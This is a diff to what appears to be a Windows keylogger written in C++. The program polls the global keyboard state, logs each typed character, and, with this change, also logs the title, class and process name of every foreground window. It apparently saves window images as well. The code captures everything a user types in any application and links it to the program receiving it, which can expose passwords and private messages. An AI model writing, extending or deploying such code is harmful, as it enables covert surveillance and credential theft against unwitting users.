@@ -221,10 +221,12 @@ public:
 	LogFlags() : m_uFlags(0) {}
 	DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, DoNotLogTime)
 	DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, PrintNewLine)
+    DEFINE_FUNCTION_SET_GET_FLAGBIT(m_uFlags, PrintWindowPointer)
 private:
 	enum Flags  {
 		DoNotLogTime,
-		PrintNewLine
+		PrintNewLine,
+        PrintWindowPointer
 	};
 	UINT m_uFlags;
 };
@@ -287,21 +289,55 @@ static void ProcessMessages() {
 	}
 }
 
-static bool GetFocusWindow(HWND &hWndFocus)
+static bool GetFocusWindow(HWND &hFocusWnd)
 {
-	bool bFocusChanged(false);
+    HWND hWndFocus(hFocusWnd);
 	while (1) {
 		HWND hCurFocus(GetForegroundWindow());
 		if (hWndFocus != hCurFocus) {
 			hWndFocus = hCurFocus;
-			bFocusChanged = true;
 			ProcessMessages();
 			Sleep(500);
 		}
 		else
 			break;
 	}
+    bool bFocusChanged(hFocusWnd != hWndFocus);
+    hFocusWnd = hWndFocus;
 	return bFocusChanged;
+}
+
+static tstring GetWindowProcessName(HWND hWnd)
+{
+    DWORD pid(0);
+    GetWindowThreadProcessId(hWnd, &pid);
+    Path processName;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (hProcess != NULL) {
+        TCHAR processImageName[1024] = { 0 };
+        GetProcessImageFileName(hProcess, processImageName, _countof(processImageName));
+        CloseHandle(hProcess);
+        processName = processImageName;
+    }
+    return processName.FileNameWithoutExt();
+}
+static tstring WindowTitle(HWND hWnd)
+{
+    TCHAR wndText[256] = { 0 };
+    GetWindowText(hWnd, wndText, ARRAYSIZE(wndText));
+    return wndText;
+}
+static void LogWindow(HWND hWndFocus, LPCTSTR msg = _T("Window"))
+{
+    tstring title(WindowTitle(hWndFocus));
+    TCHAR className[256] = { 0 };
+    GetClassName(hWndFocus, className, ARRAYSIZE(className));
+    tstring procName(GetWindowProcessName(hWndFocus));
+    tstring wndPtr;
+    if (gLogFlags.IsPrintWindowPointer())
+        wndPtr = tFormat(_T(" :0x%X"), hWndFocus);
+    gLogFlags.SetDoNotLogTime(false);
+    Log(_T("%s: %s: %s:%s%s"), msg, title.c_str(), procName.c_str(), className, wndPtr.c_str());
 }
 static bool AttachFocusWindow(HWND &hWndFocus, DWORD &prevFocusThreadID)
 {
@@ -309,15 +345,8 @@ static bool AttachFocusWindow(HWND &hWndFocus, DWORD &prevFocusThreadID)
 	bool bRet(GetFocusWindow(hWndFocus));
 	if (bRet) {
 		bRet = false;
-		TCHAR wndText[256] = { 0 };
-		GetWindowText(hWndFocus, wndText, ARRAYSIZE(wndText));
-		TCHAR className[256] = { 0 };
-		GetClassName(hWndFocus, className, ARRAYSIZE(className));
-		gLogFlags.SetDoNotLogTime(false);
-		frontText = className;
-		frontText += _T(":");
-		frontText += wndText;
-		Log(_T("Front: 0x%x %s:%s"), hWndFocus, className, wndText);
+		LogWindow(hWndFocus, _T("Front"));
+        frontText = WindowTitle(hWndFocus);
 		DWORD focusThreadID(GetWindowThreadProcessId(hWndFocus, NULL));
 		if (prevFocusThreadID != focusThreadID) {
 			DWORD currentThreadID(GetCurrentThreadId());
@@ -327,17 +356,10 @@ static bool AttachFocusWindow(HWND &hWndFocus, DWORD &prevFocusThreadID)
 		}
 	}
 	else {
-		TCHAR wndText[256] = { 0 };
-		GetWindowText(hWndFocus, wndText, ARRAYSIZE(wndText));
-		TCHAR className[256] = { 0 };
-		GetClassName(hWndFocus, className, ARRAYSIZE(className));
-		tstring text;
-		text = className;
-		text += _T(":");
-		text += wndText;
+        tstring text(WindowTitle(hWndFocus));
 		if (text != frontText) {
 			frontText = text;
-			Log(_T("Front Title: 0x%x %s:%s"), hWndFocus, className, wndText);
+            LogWindow(hWndFocus, _T("Front Title"));
 			bRet = true;
 		}
 	}
@@ -566,18 +588,13 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 	DWORD lastKeyTime[256] = { 0 };
 	DWORD prevFocusThreadID(-1);
 	bool bMinimal(true);
-	bool bLinePrinted(false);
-	//MSG msg;
-	//while (GetMessage(&msg, NULL, 0, 0))
-	//{
-	//	TranslateMessage(&msg);
-	//	DispatchMessage(&msg);
-	//}
+
+    if (!bMinimal)
+        gLogFlags.SetPrintWindowPointer();
 	while (1) {
 		BYTE keyState[256] = {0};
 		int iSaveWndImage(0);
 		if (AttachFocusWindow(hWndFocus, prevFocusThreadID)) {
-			bLinePrinted = true;
 			++iSaveWndImage;
 		}
 		if (GetKeyboardState(keyState)) {
@@ -594,11 +611,9 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 							gLogFlags.SetDoNotLogTime();
 							if (chUniCode[0]) {
 								Log(_T("%s"), chUniCode);
-								bLinePrinted = false;
 							}
-							else if (i == VK_LBUTTON && !bLinePrinted) {
+							else if (i == VK_LBUTTON && gLogFlags.IsPrintNewLine()) {
 								Log(_T("\n"));
-								bLinePrinted = true;
 							}
 							else if (i == VK_DELETE || i == VK_BACK)
 								Log(_T("ß"));
